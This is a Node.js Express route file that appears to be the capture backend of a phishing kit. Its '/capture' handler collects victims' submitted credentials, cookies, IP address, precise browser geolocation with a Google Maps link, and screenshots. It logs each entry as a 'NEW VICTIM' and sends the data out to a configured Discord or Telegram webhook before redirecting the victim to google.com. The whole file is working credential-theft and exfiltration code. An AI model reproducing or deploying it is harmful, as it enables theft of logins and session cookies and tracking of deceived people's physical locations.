  import express from 'express';
  import { join, dirname } from 'path';
  import { fileURLToPath } from 'url';
  import { appendFileSync, existsSync, mkdirSync, writeFileSync } from 'fs';
  import fetch from 'node-fetch';
  import pico from 'picocolors';
  import { loadConfig, parseUserAgent, generateRandomString } from '../utils/helpers.js';
  import { broadcastVictim } from '../core/socket.js';

  const __filename = fileURLToPath(import.meta.url);
  const __dirname = dirname(__filename);
  const ROOT = join(__dirname, '..', '..');
  const CAPTURES_DIR = join(ROOT, 'captures');

  if (!existsSync(CAPTURES_DIR)) {
    mkdirSync(CAPTURES_DIR, { recursive: true });
    console.log(pico.green('   Captures folder created'));
  }

  const router = express.Router();
  const config = loadConfig();

  router.post('/capture', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const cookies = req.headers.cookie || '';

    let ipGeo = { city: 'Unknown', country: 'Unknown' };
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}?fields=city,country,lat,lon`);
      ipGeo = await response.json();
    } catch {}

    let preciseGeo = null;
    if (req.body.geolocation) {
      if (req.body.geolocation === 'denied') {
        preciseGeo = 'Denied by user';
      } else {
        try {
          preciseGeo = JSON.parse(req.body.geolocation);
        } catch {
          preciseGeo = 'Invalid';
        }
      }
    }

    let screenshotPath = null;
    if (req.body.screenshot) {
      try {
        const base64Data = req.body.screenshot.replace(/^data:image\/(png|jpeg|jpg);base64,/, '');
        const fileId = generateRandomString(8);
        const ext = req.body.screenshot.includes('image/jpeg') || req.body.screenshot.includes('image/jpg') ? 'jpg' : 'png';
        screenshotPath = join(CAPTURES_DIR, `screenshot_${fileId}.${ext}`);
        writeFileSync(screenshotPath, base64Data, 'base64');
      } catch (err) {
        console.error(pico.red('   Error saving screenshot:'), err.message);
      }
    }

    const victim = {
      template: req.query.t || req.body.t || 'unknown',
      ip,
      ipLocation: `${ipGeo.city || 'Unknown'}, ${ipGeo.country || 'Unknown'}`,
      preciseGeolocation: preciseGeo,
      userAgent,
      cookies: cookies || 'None',
      data: req.body,
      screenshot: screenshotPath ? screenshotPath.split('/').pop() : null,
      timestamp: new Date().toISOString(),
      mapLink: preciseGeo && typeof preciseGeo === 'object' 
        ? `https://www.google.com/maps?q=${preciseGeo.latitude},${preciseGeo.longitude}`
        : null
    };

    const logEntry = `
  ╔══════════════════════════════════════════════════════════╗
                    NEW VICTIM CAPTURED
  ╚══════════════════════════════════════════════════════════╝
  Template           : ${victim.template.toUpperCase()}
  IP                 : ${victim.ip}
  IP Location        : ${victim.ipLocation}
  Precise Geo        : ${victim.preciseGeolocation ? (typeof victim.preciseGeolocation === 'object' ? JSON.stringify(victim.preciseGeolocation) : victim.preciseGeolocation) : 'Not available'}
  Map Link           : ${victim.mapLink || 'N/A'}
  Time               : ${new Date(victim.timestamp).toLocaleString('es-ES')}
  Screenshot         : ${victim.screenshot ? 'Saved as ' + victim.screenshot : 'Not captured'}

  Credentials:
  ${JSON.stringify(victim.data, null, 2)}

  ═══════════════════════════════════════════════════════════
  `;

    const fileId = generateRandomString(8);
    const fileName = join(CAPTURES_DIR, `${victim.template}_${fileId}.txt`);
    appendFileSync(fileName, logEntry);
    appendFileSync(join(CAPTURES_DIR, 'all_captures.log'), logEntry);

    broadcastVictim({ ...victim, deviceInfo: parseUserAgent(userAgent) });

    if (config.notifications?.webhookUrl) {
      const webhookUrl = config.notifications.webhookUrl;

      let message = {
        content: `**NEW VICTIM - ${victim.template.toUpperCase()}**`,
        embeds: [{
          title: "Capture details",
          color: 0x00ff00,
          fields: [
            { name: "IP", value: victim.ip, inline: true },
            { name: "IP location", value: victim.ipLocation, inline: true },
            { name: "Geo precise", value: victim.preciseGeolocation ? (typeof victim.preciseGeolocation === 'object' ? JSON.stringify(victim.preciseGeolocation) : victim.preciseGeolocation) : 'No', inline: false },
            { name: "Map", value: victim.mapLink ? `[View on Google Maps](${victim.mapLink})` : 'N/A', inline: false },
            { name: "Credentials", value: "```json\n" + JSON.stringify(victim.data, null, 2) + "\n```", inline: false },
            { name: "Time", value: new Date(victim.timestamp).toLocaleString('es-ES'), inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      if (webhookUrl.includes('api.telegram.org')) {
        message = {
          text: `*NEW VICTIM - ${victim.template.toUpperCase()}*\n\n` +
                `*IP:* ${victim.ip}\n` +
                `*Location:* ${victim.ipLocation}\n` +
                `*Geo precise:* ${victim.preciseGeolocation ? (typeof victim.preciseGeolocation === 'object' ? JSON.stringify(victim.preciseGeolocation) : victim.preciseGeolocation) : 'No'}\n` +
                `*Credentials:* \n\`\`\`json\n${JSON.stringify(victim.data, null, 2)}\n\`\`\`\n` +
                `*Time:* ${new Date(victim.timestamp).toLocaleString('es-ES')}`,
          parse_mode: 'Markdown'
        };
      }

      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message)
        });
      } catch (err) {
        console.error(pico.red('   Error sending webhook:'), err.message);
      }
    }

    const redirectTo = req.body.redirect || 'https://google.com';
    res.redirect(redirectTo);
  });

  export default router;